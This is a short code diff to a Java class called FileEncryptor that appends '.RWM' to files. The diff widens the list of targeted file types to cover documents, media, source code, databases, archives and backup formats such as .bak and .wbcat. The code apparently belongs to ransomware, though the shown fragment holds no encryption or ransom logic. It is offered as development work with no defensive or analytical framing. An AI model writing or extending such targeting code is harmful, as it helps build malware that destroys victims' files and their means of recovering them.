@@ -13,9 +13,26 @@ public class FileEncryptor {
     private static final String EXTENSION = ".RWM";
 
     private static final String[] TARGET_EXTENSIONS = {
-        ".pdf", ".xls", ".ppt", ".doc", ".docx", ".accd", ".rtf", ".txt", ".py", ".csv",
-        ".jpg", ".jpeg", ".png", ".gif", ".avi", ".midi", ".mov", ".mp3", ".mp4",
-        ".mpeg", ".mpeg2", ".mpeg3", ".mpg", ".mkv", ".ogg"
+        // Documents & Office
+        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".rtf", ".txt", ".odt", ".ods", ".odp", ".tex", ".log", ".csv", ".accd", ".accdb",
+
+        // Images
+        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai", ".svg", ".raw", ".cr2", ".nef",
+
+        // Audio
+        ".mp3", ".wav", ".flac", ".midi", ".ogg",
+
+        // Video
+        ".avi", ".mov", ".mp4", ".mpeg", ".mpeg2", ".mpeg3", ".mpg", ".mkv", ".flv", ".3gp", ".m4v", ".wmv",
+
+        // Archives & Backups
+        ".zip", ".rar", ".7z", ".tar", ".gz", ".bak", ".backup", ".wbcat",
+
+        // Code & Developer Files
+        ".py", ".html", ".htm", ".php", ".js", ".css", ".cpp", ".c", ".java", ".cs", ".vb", ".asp", ".aspx", ".cgi", ".pl",
+
+        // Databases
+        ".sql", ".db", ".dbf", ".mdb", ".accdb", ".accd"
     };
 
     private static final String[] TARGET_FOLDERS = {
